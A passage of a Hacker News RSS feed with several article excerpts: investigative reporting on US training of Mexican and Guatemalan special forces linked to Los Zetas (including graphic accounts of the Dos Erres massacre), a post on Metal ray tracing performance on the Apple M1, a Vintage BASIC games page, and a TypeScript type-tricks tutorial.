href="https://www.kold.com/story/3394374/los-zetas-draw-concern-of-us-government/">Ft. Benning</a> in Georgia, others at <a href="https://www.aljazeera.com/features/2010/11/03/us-trained-cartel-terrorises-mexico/">Ft. Bragg</a> in North Carolina, while other rumors suggest it was at <a href="https://www.army.mil/article/63245/army_north_hosts_mexican_army_leaders_to_strengthen_relationships">Ft. Hood</a> in Texas. According to Lt. Col. Craig Deare (retired), the former Academic Dean at the intellectual center of gravity of U.S. defense policy in Latin America since 1997, the Center for Hemispheric Defense Studies (CHDS), it was likely that more than 500 Mexican GAFES received training from U.S. special operations forces (SOF).</p><p>According to <a href="https://www.aljazeera.com/features/2010/11/03/us-trained-cartel-terrorises-mexico/">reporting</a> in Al Jazeera:</p><p><em>Some of the cartelâ€™s initial members were elite Mexican troops, trained in the early 1990s by Americaâ€™s 7th Special Forces Group or â€œsnake eatersâ€� at Ft. Bragg, North Carolina, a former US special operations commander has told Al Jazeera.</em></p><p><em>â€œThey were given map reading courses, communications, standard special forces training, light to heavy weapons, machine guns and automatic weapons,â€� says Craig Deare, the former special forces commander who is now a professor at the US National Defence University.</em></p><p><em>â€œI had some visibility on what was happening, because this [issue] was related to things I was doing in the Pentagon in the 1990s,â€� Deare, who also served as [Mexico] director in the office of the US Secretary of Defence, says.</em></p><p>The <a href="https://en.wikipedia.org/wiki/7th_Special_Forces_Group_(United_States)">7th Special Forces Group</a> (SFG) specializes in the approach the U.S. has taken with Latin America since the end of the second world war: unconventional warfare, counterinsurgency and, more recently, counterterrorism. During the Reagan administration in the 1980s, the 7th SFG trained, supported and fought with some of the most brutal and repressive special operations and unconventional forces in El Salvador, Guatemala, Honduras, Panama, Colombia, Peru, Bolivia and Venezuela.</p><figure><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-2.45.27-PM.png"><figcaption>A U.S. special forces Soldier assigned to 7th SF Group, oversees a group of Guatemalan Special Forces "Kaibils" conduct pistol marksmanship training Jan. 28 in Poptun, Guatemala (<a href="https://www.dvidshub.net/image/1749645/kaibil-us-special-forces-promote-security-through-partnership">DVIDS</a>)</figcaption></figure><p>Between 1996 and 1999, <a href="https://www.jornada.com.mx/1998/08/16/mexico.html">3,200 soldiers</a>, including at least 500 GAFES, were reportedly trained by the 7th SFG in the U.S. to create elite "counternarcotics" forces for fighting on behalf of the post-Cold War U.S. national security agenda.</p><p>Conveniently framed as an ironic consequence of the corrupting influence of the cartels, the training from the U.S. special forces diffused into the service of one of Mexico's oldest drug trafficking organizations. In 1997, the same year that the Center for Hemispheric Defense Studies was founded, Arturo GuzmÃ¡n Decena, a GAFE later known by the alias "<a href="https://en.wikipedia.org/wiki/Arturo_Guzm%C3%A1n_Decena">El Zeta-uno</a>", supposedly defected along with other elite Mexican soldiers to work for the Gulf cartel in Tamaulipas. The GAFES trained by the U.S. in counterinsurgency and unconventional warfare to fight drug-trafficking would become one of the most infamous drug-trafficking organizations in Mexico: Los Zetas.</p><p>The School of the Americas changed the way that organized crime operates in Mexico. <em>Los Zetas</em> application of advanced training in insurgency and terror justified President Felipe CalderÃ³n's (2006-2012) decision to <a href="https://www.chicagotribune.com/hoy/ct-hoy-8766718-la-guerra-contra-el-narco-en-mexico-costosa-cara-y-mortal-story.html">deploy the military</a> to prosecute the War against Drug-trafficking in his first month in office. The consequences of that decision have been devastating for Mexico.</p><figure><img src="https://publish.narco.news/content/images/2020/10/Screen-Shot-2020-10-19-at-2.08.25-PM-5.png"><figcaption>INEGI</figcaption></figure><p>According to a <a href="https://nsarchive2.gwu.edu/NSAEBB/NSAEBB445/docs/20090700ca.PDF">2009 DEA memo</a>, Los Zetas also recruited other U.S.-trained SOF in Latin America, like the Kaibiles. The Kaibiles and other Guatemalan security forces were trained by the U.S. in counterinsurgency and unconventional warfare before, during and after Guatemala's 36-year <a href="https://www.nytimes.com/1999/02/26/world/guatemalan-army-waged-genocide-new-report-finds.html">genocide</a>. After a 1999 report commissioned by the United Nations determined that the 200,000+ people killed and disappeared by the Guatemalan Army was, <a href="https://www.nytimes.com/1999/02/26/world/guatemalan-army-waged-genocide-new-report-finds.html">in fact, genocide</a>, the School of the Americas briefly closed before opening a year later as the Western Hemisphere Institute for Security Cooperation (WHINSEC). According to <a href="https://www.sfgate.com/default/article/Bay-Area-protesters-sentenced-in-Georgia-Jail-2796779.php">testimony</a> from Major Joseph Blair, a former instructor at the school, the changes were only superficial and an identical curriculum was taught from the exact same instruction manuals. Between 1999 and 2010, <a href="http://www.ghrc-usa.org/Publications/factsheet_kaibiles.pdf">3,555 Guatemalan soldiers</a>, many of them Kaibiles, were trained by the U.S. through WHINSEC and other programs.</p><figure><div><div><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-2.58.27-PM.png" width="1256" height="712"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-10.11.53-AM.png" width="1462" height="944"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-10.11.36-AM.png" width="1462" height="944"></p></div></div><figcaption><a href="https://www.nytimes.com/1999/02/26/world/guatemalan-army-waged-genocide-new-report-finds.html">New York Times</a>; <a href="https://www.aaas.org/sites/default/files/s3fs-public/mos_en.pdf">CEH</a>;</figcaption></figure><p>The Kaibiles are taught to kill without mercy or thought. In training, recruits are given a puppy to look after and bond with for several weeks before being ordered to kill the animal with their bare hands, drink the blood and eat the raw flesh, a method which <a href="https://www.voltairenet.org/Los-Kaibiles-mexicanos">reportedly</a> has since diffused to the Mexican GAFES and other forces that train with the Kaibiles. Like the "snake eaters" of the U.S. 7th SFG, the Kaibiles kill to eat and live to kill. Their motto is: "<em>Si avanzo, sÃ­gueme. Si me detengo, aprÃ©miame. Si retrocedo, mÃ¡tame!</em> / <em>If I advance, follow me. If I stop, urge me on. If I retreat, kill me!"</em></p><figure><div><div><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-23-at-2.12.06-PM-1.png" width="1256" height="946"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-23-at-2.23.00-PM.png" width="1222" height="776"></p></div></div><figcaption>Participant in the Dos Erres massacre and former School of the Americas Instructor Pedro Pimental Rios (<a href="https://www.ocweekly.com/pedro-pimentel-rios-accused-in-guatemalan-massacre-to-be-deported-6479330/">OC Weekly</a>; <a href="https://www.ice.gov/news/releases/ice-removes-former-member-guatemalan-army-linked-1980s-massacre">ICE</a>)</figcaption></figure><p>In 1982, the Kaibiles massacred 226 people in the Dos Erres village in Guatemala. According to the <a href="https://www.aaas.org/sites/default/files/s3fs-public/mos_en.pdf">United Nations Truth Commission Clarification</a> and reporting by <a href="https://www.propublica.org/article/finding-oscar-massacre-memory-and-justice-in-guatemala">ProPublica</a>, they arrived in the middle of the night and accused the residents of being guerrilla sympathizers. The smallest children were killed by smashing their heads against trees and the sides of buildings, while older children were killed with a hammer. Adults were interrogated and tortured, one by one, and the women were raped by the Kaibiles. The Kaibiles also cut fetuses out of pregnant women. After the interrogation, the adults were also killed with a hammer and the corpses were dumped in a well. A few years after the massacre, one of the Kaibil officers who had supervised the atrocity, Pedro Pimental Rios, became an instructor at the School of the Americas. He was extradited from the U.S. in 2012 and sentenced to more than 6,000 years in prison for his involvement.</p><p>According to a declassified <a href="https://nsarchive2.gwu.edu/NSAEBB/NSAEBB32/docs/doc42.pdf">Defense Intelligence Agency (DIA) memo</a> from 1994, intelligence sources described clandestine graves outside of a Guatemalan military facility. The memo described Guatemalan soldiers flying captives over the ocean before pushing them out of helicopters to their deaths, a technique also used in <a href="https://www.nytimes.com/1995/03/13/world/argentine-tells-of-dumping-dirty-war-captives-into-sea.html">Argentina</a>. In 2015, former Chilean military officer Jaime Garcia Covarrubias was <a href="https://www.mcclatchydc.com/news/nation-world/national/national-security/article24781345.html">arrested</a> for torturing and executing seven people in 1973. He had been a faculty member at the Center for Hemispheric Defense Studies for 13 years.</p><figure><div><div><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-2.09.33-PM.png" width="1100" height="1436"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-2.10.15-PM-1.png" width="1100" height="1436"></p></div><div><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-2.10.38-PM.png" width="1100" height="1436"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-23-at-2.29.05-PM.png" width="1238" height="740"></p></div></div><figcaption><a href="https://nsarchive2.gwu.edu/NSAEBB/NSAEBB32/docs/doc42.pdf">National Security Archive</a>; <a href="https://www.nytimes.com/1995/03/13/world/argentine-tells-of-dumping-dirty-war-captives-into-sea.html">New York Times</a></figcaption></figure><p>After the end of the Cold War, the Kaibiles were <a href="https://www.aljazeera.com/features/2011/8/15/guatemalas-feared-special-forces">repurposed</a> to fight the United States' new greatest threat to national security: drugs. From 2007 to 2014, U.S. SOF training <a href="https://www.wola.org/analysis/u-s-special-operations-latin-america-parallel-diplomacy/">tripled</a> in Latin America, mostly in the area of responsibility (AOR) of U.S. Department of Defense's Southern Command (SOUTHCOM) in the Caribbean, Central and South America. The U.S. military continues training the Kaibiles to this day. </p><figure><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-21-at-1.03.23-PM.png"><figcaption>U.S. soldiers training with the Kaibiles in Information Operations, July 2019 (<a href="https://www.dvidshub.net/image/5602004/us-soldiers-trek-through-jungles-with-guatemalan-special-forces">DVIDS</a>)</figcaption></figure><hr><p>While the Mexican military was fighting a war nominally against violent drug-trafficking organizations like <em>Los Zetas</em>, the U.S. military was developing and spreading a new doctrine for waging a new regional war on terror in Latin America. A <a href="https://apps.dtic.mil/dtic/tr/fulltext/u2/a475840.pdf">2007 academic paper</a> outlined a new <strong>distributed operational model</strong> for command and control (C2) for Special Operations Command in the U.S. SOUTHCOM AOR based on the approach of the U.S. Marine Corps (USMC). The authors recognized the USMC approach as, "better suited for counterinsurgency and non-combat environments, where the objectives are more ambivalent." According to the authors:</p><p><em>In standard military maneuver operations where missions such as â€œattack that position,â€� are clearly defined, the [conventional] definition of C2 is sufficient. However, in an ambiguous environment where SOF often operates, the mission (e.g., plan and execute UW [Unconventional Warfare]) is not as clearly defined. As a result, a special operator in the field must be able to operate with maximum authority, flexibility, and agility to respond to immediate changes emerging from dynamic situations. The USMC definition reflects precisely how SOCSOUTHâ€™s staff currently approaches C2 in its theater of operations.</em></p><p>Officers from the Colombian military studying at the <strong>United State Marine Corps Command and Staff College</strong> at the Marine Corps University quickly recognized the advantages of the U.S. approach. According to a <a href="https://apps.dtic.mil/dtic/tr/fulltext/u2/a491149.pdf">2008 academic paper</a>…</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://narco.news/unconventional-warfare-in-mexico">https://narco.news/unconventional-warfare-in-mexico</a></em></p>]]>
            </description>
            <link>https://narco.news/unconventional-warfare-in-mexico</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502435</guid>
            <pubDate>Tue, 22 Dec 2020 03:11:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Dive into Ray Tracing Performance on the Apple M1]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25502201">thread link</a>) | @phenylene
<br/>
December 21, 2020 | https://www.willusher.io/graphics/2020/12/20/rt-dive-m1 | <a href="https://web.archive.org/web/*/https://www.willusher.io/graphics/2020/12/20/rt-dive-m1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		
<p>The Apple M1 available in the MacBook Air, MacBook Pro 13”, and Mac Mini has
been the focus of a ton of benchmarking writeups and blog posts about
the new chip. The performance overall, and especially performance/watt,
that Apple has achieved with the chip is very impressive.
As a ray tracing person, what caught my eye the most was the
performance AnandTech reported in their
<a href="https://www.anandtech.com/show/16252/mac-mini-apple-m1-tested/2">CineBench benchmarks</a>.
These scores were 1.6x higher than I got on my old Haswell desktop and 2x
higher than my new Tiger Lake laptop!
I had also been interested in trying out the new
<a href="https://developer.apple.com/videos/play/wwdc2020/10012/">ray tracing API for Metal</a>
that was announced at WWDC this year,
which bears some resemblance to the DirectX, Vulkan, and OptiX GPU ray tracing APIs.
So, I decided to pick up a Mac Mini to do some testing
on my own interactive path tracing project,
<a href="https://github.com/Twinklebear/ChameleonRT">ChameleonRT</a>,
and to get it running on the new Metal ray tracing API.
In this post, we’ll take a look at the new Metal ray tracing
API to see how it lines up with DirectX, Vulkan, OptiX and Embree,
then we’ll make some fair (and some extremely unfair) ray tracing
performance comparisons against the M1.</p>

<!--more-->



<p><a href="https://github.com/Twinklebear/ChameleonRT">ChameleonRT</a> is an open source
interactive path tracer that I’ve been working on to learn the different ray tracing APIs,
and to provide an example or starting point for myself and others working with them
in other projects.
ChameleonRT provides backends for the GPU ray tracing APIs:
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/dxr">DirectX Ray Tracing</a>,
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/vulkan">Vulkan KHR Ray Tracing</a>,
and <a href="https://github.com/Twinklebear/ChameleonRT/tree/master/optix">OptiX 7</a>.
Through the work discussed in this post, it also has a new
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/metal">Metal</a> GPU backend.
ChameleonRT also has an <a href="https://github.com/Twinklebear/ChameleonRT/tree/master/embree">Embree backend</a>
for fast multi-threaded and SIMD accelerated ray tracing on CPUs through
<a href="https://www.embree.org/">Embree</a>, <a href="https://ispc.github.io/">ISPC</a>, and <a href="https://github.com/oneapi-src/oneTBB">TBB</a>.
The rendering code in each backend is nearly identical and they produce almost pixel exact outputs,
with some possible small differences due to subtle differences in the ray tracing
libraries or shader languages.</p>

<p>ChameleonRT is different from popular ray tracing benchmark applications like
<a href="https://www.maxon.net/en/cinebench">CineBench</a>, <a href="http://www.luxmark.info/">LuxMark</a>,
and <a href="https://opendata.blender.org/">Blender Benchmark</a>, in that ChameleonRT is
a minimal interactive path tracer. CineBench, LuxMark, and Blender Benchmark are excellent
for getting a full picture of what performance to expect from a production film
renderer, as they are production renderers. However, there’s a lot more going
on in a production renderer than just ray tracing to support the kind of complex
geometries, materials, and effects used in film; and the large code
bases can be challenging to quickly port to a new architecture or API.
ChameleonRT is the exact opposite, supporting just one geometry type,
triangle meshes, and one material type, the Disney BRDF.
The rest of the code is similarly written to achieve interactive path tracing performance,
though I have tried to balance this with how complex the code is to read.
For example, the renderers use iterative ray tracing instead of recursion,
support only a simple sampling strategy, and don’t support alpha cut-out effects.
The use of iterative ray tracing is valuable on both the CPU and GPU, but is
especially important on the GPU, as the
overhead of recursive ray tracing calls in the pipeline can have a significant performance impact.
Similarly, ignoring alpha cut-out effects allows the GPU renderers
to skip using an any hit shader (and the Embree on to skip needing an intersection
filter). The any hit shader (or intersection filter) would be called during
BVH traversal after a candidate intersection with a triangle is found.
In the case that the BVH traversal is hardware accelerated, this ends up
producing a lot amount of back and
forth between the fixed function traversal hardware and the shader cores to run the any hit
shader during traversal, limiting the hardware’s performance.</p>

<blockquote>
  <p>What’s a path tracer? Path tracing is a technique in computer graphics for
rendering photo-realistic images by simulating the light transport in
the scene. It is a Monte Carlo technique, meaning that it randomly samples
light paths emitted from lights in the scene that reach the camera
by bouncing off objects in the scene. This is done by tracing the paths in reverse,
starting from the camera and tracing the path back through the scene.
A large number of light paths need to be sampled to produce a noise-free
image. Path tracing is not restricted to photo-realism, and is the
core rendering algorithm used in major film renderers, such as: Pixar’s Renderman,
Disney’s Hyperion, Autodesk’s Arnold, and Weta’s Manuka.
See <a href="https://en.wikipedia.org/wiki/Path_tracing">Wikipedia</a> for more.</p>
</blockquote>



<p>The new ray tracing API in Metal will be familiar to those who’ve used inline ray
tracing in DirectX or Vulkan. For a good introduction to Metal’s API, check out the <a href="https://developer.apple.com/videos/play/wwdc2020/10012/">Discover ray tracing
with Metal</a> video from WWDC 2020,
and the <a href="https://developer.apple.com/documentation/metal/accelerating_ray_tracing_using_metal?language=objc">accompanying sample</a>.
Inline ray tracing allows applications to make ray tracing calls in any shader stage,
e.g., fragment/pixel shaders, vertex shaders, compute shaders, etc.
Inline ray tracing allows ray tracing effects, for example accurate reflections and shadows,
to be integrated into the regular rasterization pipeline.
Inline ray tracing can also be used from a compute shader to implement a standalone
path tracing based renderer. ChameleonRT is a standalone path tracer, and takes
the compute shader approach for Metal.</p>

<p>At a high-level, ray tracing in Metal proceeds as follows: you upload your
geometry data, build bottom-level primitive acceleration structures over them, then create instances
referencing those acceleration structures and build a top-level acceleration structure over
the instances.
To render the scene you dispatch a compute shader and trace rays against the top-level
acceleration structure to get back intersection results. The intersection results provide
you with the intersected primitive and geometry IDs, and if using instancing, the instance ID.
Your shader can then look up the geometry data for the object that was hit and shade it,
after which it can continue tracing the path.</p>

<p>At this time Metal only supports inline ray tracing, in contrast to DirectX and Vulkan, which
also provide support for ray tracing pipelines. Ray tracing pipelines are used
to implement standalone ray tracing renderers, and is the approach ChameleonRT
uses in its DirectX and Vulkan backends.
OptiX only supports ray tracing pipelines.
Ray tracing pipelines require the creation of a Shader Binding Table to
provide the API with a table of functions to call when specific objects
in the scene are intersected. The SBT can be difficult to setup and debug,
and is a common point of difficulty for developers learning these APIs.
For more information about the SBT, check out my post
<a href="https://www.willusher.io/graphics/2019/11/20/the-sbt-three-ways">“The RTX Shader Binding Table Three Ways”</a>.
However, the potential benefit of the SBT is that the GPU can reorder or group function
calls to reduce thread divergence. With inline ray tracing, the developer
must do this themselves, or do without
(check out another video from <a href="https://developer.apple.com/videos/play/wwdc2020/10013/">WWDC20</a>
for information here).
Right now, ChameleonRT does not do any reordering to reduce divergence.</p>

<p>Those familiar with Metal may know of the previous
<a href="https://developer.apple.com/documentation/metalperformanceshaders/metal_for_accelerating_ray_tracing?language=objc">Metal Performance Shaders ray intersector</a>.
The new support for inline ray tracing improves on this by allowing the renderer
to move entirely to the GPU. The previous ray intersector worked by taking
batches of rays, finding intersections in the scene, and writing these results
back out to memory. Multiple compute shaders would need to be dispatched to
trace the primary rays and create shadow and secondary rays, then trace the shadow rays
and continue the secondary rays while filtering out paths that terminated.
This requires significantly more memory traffic and compute dispatches, introducing overhead
to the renderer. Such an approach is also not well suited to augmenting traditional
rasterization pipelines with ray tracing effects.
Approaches based on tracing and sorting rays and intersection information to extract
coherence are valuable for complex film renderers, and can be implemented efficiently using inline
ray tracing as well.
For example, <a href="https://www.yiningkarlli.com/projects/hyperiondesign.html">Disney’s Hyperion renderer</a>
uses sorting and batching extensively to
extract coherent workloads from an otherwise incoherent and divergent distribution of rays.
There’s also an excellent higher-level <a href="https://youtu.be/frLwRLS_ZR0">video</a> explaining how this
works.</p>

<p>The Metal ray tracing API is quite nice to work with.
It bears a lot of similarity to the other ray tracing APIs, but has been streamlined
to be easier to use.
For example, compare the code required to build and compact a BVH in
<a href="https://github.com/Twinklebear/ChameleonRT/blob/master/dxr/dxr_utils.cpp#L877-L977">DirectX</a>
or <a href="https://github.com/Twinklebear/ChameleonRT/blob/master/vulkan/vulkanrt_utils.cpp#L46-L214">Vulkan</a>
with <a href="https://github.com/Twinklebear/ChameleonRT/blob/master/metal/metalrt_utils.mm#L318-L396">Metal</a>.
OptiX’s API provides a similar simplification, here’s the
<a href="https://github.com/Twinklebear/ChameleonRT/blob/master/optix/optix_utils.cpp#L183-L244">BVH build in OptiX</a>
for reference.
It’s also nice to have templates and C++ style functionality in the shader language,
a feature Metal shares with OptiX, which uses CUDA for the device side code.</p>

<p>This simplicity also has some drawbacks. For example, while in DirectX, Vulkan, and OptiX
you have control over where the acceleration structure memory is allocated,
Metal makes this allocation for you. As a result, you cannot allocate the acceleration
structures on a <code>MTLHeap</code>, and so to make sure they’re available for your rendering
pipeline, you must individually mark them as used in a loop instead of a single <code>useHeap</code> call.</p>

<figure><pre><code data-lang="objc"><span></span><span>// Use our top level acceleration structure</span>
<span>[</span><span>command_encoder</span> <span>setAccelerationStructure</span><span>:</span><span>bvh</span><span>-&gt;</span><span>bvh</span> <span>atBufferIndex</span><span>:</span><span>1</span><span>];</span>
<span>// Also mark all mesh acceleration structures used, as they're indirectly</span>
<span>// referenced by the top level one</span>
<span>for</span> <span>(</span><span>auto</span> <span>&amp;</span><span>mesh</span> <span>:</span> <span>bvh</span><span>-&gt;</span><span>meshes</span><span>)</span> <span>{</span>
    <span>[</span><span>command_encoder</span> <span>useResource</span><span>:</span><span>mesh</span><span>-&gt;</span><span>bvh</span> <span>usage</span><span>:</span><span>MTLResourceUsageRead</span><span>];</span>
<span>}</span></code></pre></figure>

<p>This can add some overhead if you have a lot of bottom level BVHs, as can be the
case in scenes with many instances.
It’d be nice to be able to allocate the acceleration structures on a heap, and replace this loop
with a single <code>[command_encoder useHeap:data_heap-&gt;heap];</code></p>

<p>The API is also simplified significantly by not including ray tracing pipelines and
only requiring a Shader Binding Table-esque
structure when implementing custom geometries or other operations that need
to happen …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.willusher.io/graphics/2020/12/20/rt-dive-m1">https://www.willusher.io/graphics/2020/12/20/rt-dive-m1</a></em></p>]]>
            </description>
            <link>https://www.willusher.io/graphics/2020/12/20/rt-dive-m1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502201</guid>
            <pubDate>Tue, 22 Dec 2020 02:27:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vintage Basic – Games]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25502018">thread link</a>) | @Fjolsvith
<br/>
December 21, 2020 | http://vintage-basic.net/games.html | <a href="https://web.archive.org/web/*/http://vintage-basic.net/games.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">
  <div><p>
      The classic book <a href="http://www.amazon.com/BASIC-Computer-Games-Microcomputer-David/dp/0894800523">
      <em>BASIC Computer Games</em></a>,
      published by <a href="http://en.wikipedia.org/wiki/Creative_Computing">Creative Computing</a>,
      inspired a generation of programmers.  The games were written by many people, and compiled by
      <a href="http://www.swapmeetdave.com/Ahl/DHAbio.htm">David H. Ahl</a>. The fabulous illustrations
      accompanying each game were done by
      <a href="http://www.bekerbots.com/">George Beker</a>.
      </p>
      <p>
      I've included all the games here for your tinkering pleasure.
      I've tested and tweaked each one of them to make sure they'll run with Vintage BASIC, though you may see
      a few oddities. That's part of the fun of playing with BASIC: it never works quite the same on two machines.
      The games will play better if you keep CAPS LOCK on, as they were designed to be used with capital-letter
      input.
    </p>
    <p>
      The table below includes both links to the pages of the book at
      <a href="http://www.atariarchives.org/basicgames/">atariarchives.org</a>,
      and the source code for each game.  I obtained most of the source code from
      <a href="http://www.classicbasicgames.org/">classicbasicgames.org</a>, with the exception
      of Civil War and Super Star Trek, which I entered myself.  The descriptions mainly come
      from an earlier edition of the book, <em>101 BASIC Computer Games</em>, via the scans at
      <a href="http://www.digibarn.com/collections/books/basicgames/">digibarn.com</a>.
      All book content is provided with the express consent of
      David H. Ahl, editor.
    </p>
    <p>
      You can download the <strong>entire set</strong> of games as a tarball
      (<a href="http://vintage-basic.net/downloads/bcg.tar.gz">bcg.tar.gz</a>)
      or a ZIP archive (<a href="http://vintage-basic.net/downloads/bcg.zip">bcg.zip</a>).
    </p>
  </div>
  <p><small>© 2009–2017 Lyle Kopnicky</small>
  </p></div></div>]]>
            </description>
            <link>http://vintage-basic.net/games.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502018</guid>
            <pubDate>Tue, 22 Dec 2020 01:54:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced TypeScript Type Tricks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25501761">thread link</a>) | @dested
<br/>
December 21, 2020 | https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/ | <a href="https://web.archive.org/web/*/https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
        <div>

            
            <div>

                
                <h3 id="a-journey">A journey</h3>
<p>After spending some time in TypeScript you may begin to crave type safety everywhere in your life. JavaScript is an inherently unsafe language and there are dragons to be found everywhere and in almost every framework. Most frameworks are sufficiently covered, but what if you design a beautiful API internally that needs to be incredibly feature rich, and incredibly safe, but still allow for the best JavaScript idioms. Well at that point you may have to dive into writing some pretty gnarly types.</p>
<p>In general there are a number of TypeScript TYPE libraries out there, <a href="https://github.com/millsp/ts-toolbelt">ts-toolbelt</a>, <a href="https://github.com/piotrwitek/utility-types">utility-types</a>, <a href="https://www.npmjs.com/package/type-fest">type-fest</a> to name a few. These libraries are great, and contain a plethora of information, but they are generally sparse in describing HOW they created their utility types.</p>
<blockquote>
<p>There are a lot of great type libraries, but no great documentation on how they’re built</p>
</blockquote>
<p>The goal of this post is to not only expose some great utility types, but also some tips and tricks that I realized along the way. Unfortunately this post requires a relatively strong understanding of TypeScript types and tricks. <a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html">Advanced Types</a> is a great place to start before diving in!</p>
<h3 id="esoteric-solutions">Esoteric solutions</h3>
<p>A lot of these solutions (and problems) may feel esoteric, and that’s because frankly they are. They are not for the faint of heart, they do not need to be known for daily TypeScript use. They are the nitty-gritty realities of writing type libraries for incredibly complex or il-defined JavaScript problems.</p>
<p>Most of these types come from a few TypeScript libraries im working on, namely <a href="https://www.npmjs.com/package/safe-schema">safe-schema</a>, and <a href="https://www.npmjs.com/package/mongo-safe">mongo-safe</a>, both of which I intend to do lengthy blog posts on in the future.</p>
<p>I have tried to organize these with an example of the usage, and the reason why the problem or solution is novel or interesting. They are in no particular order.</p>
<p>
  <img src="https://casualdeveloper.net/img/youshouldnt.gif" alt="I didnt say they couldnt I said you shouldnt">

</p>
<hr>
<h2 id="setting-a-variable-extends-infer">Setting A Variable (<code>extends infer</code>)</h2>
<h3 id="example">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> {item: <span>Fancy</span>&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>} <span>|</span> 
                Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span> <span>|</span> 
                [Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>, Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>] <span>|</span> 
                [Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>];
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span> <span>extends</span> <span>infer</span> TItem <span>?</span> 
                {item: <span>TItem</span>} <span>|</span> TItem <span>|</span> [TItem, TItem] <span>|</span> [TItem]<span>:</span>
                Impossible;

<span>type</span> Impossible <span>=</span> <span>never</span>;
</code></pre></div>
<h3 id="reason">Reason</h3>
<p>Occasionally you will need to use the same type over and over in your type definition. Every time TypeScript encounters your type it will have to evaluate it again. Using the infer trick you can store a variable in your type that you can use throughout the rest of it.</p>
<p>You will see this <code>extends infer</code> trick pop up in a few places. <code>infer</code> has some interesting properties that make it useful when defining complex types.</p>
<p>Note the use of <code>Impossible</code> here. We can never reach the Impossible branch, so typically we would specify never here, but I have found just putting never there will be confusing in the future when looking at these types again thinking that never branch could possibly be hit. The use of explicit type alias’s that resolve to basic types is a great way to be explicit in your definitions.</p>
<p><em>Note:</em> This will not work if the result of your type is <code>never</code>. If T or <code>Fancy&lt;Shmancy&lt;Deeply&lt;Nested&lt;T&gt;&gt;&gt;&gt;</code> is never, the whole expression will result in <code>never</code>.</p>
<hr>
<h2 id="type-is-never">Type is <code>never</code></h2>
<h3 id="example-1">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>never</span> <span>?</span> 1 : <span>0</span>;

<span>type</span> Test1 <span>=</span> Shoes<span>&lt;</span><span>'hi'</span><span>&gt;</span>; <span>// 0
</span><span></span><span>type</span> Test2 <span>=</span> Shoes&lt;<span>never</span>&gt;; <span>// never
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> [T] <span>extends</span> [<span>never</span>] <span>?</span> 1 : <span>0</span>;
<span>//              ^ ^         ^     ^
</span><span></span><span>type</span> Test1 <span>=</span> Shoes<span>&lt;</span><span>'hi'</span><span>&gt;</span>; <span>// 0
</span><span></span><span>type</span> Test2 <span>=</span> Shoes&lt;<span>never</span>&gt;; <span>// 1
</span></code></pre></div>
<h3 id="reason-1">Reason</h3>
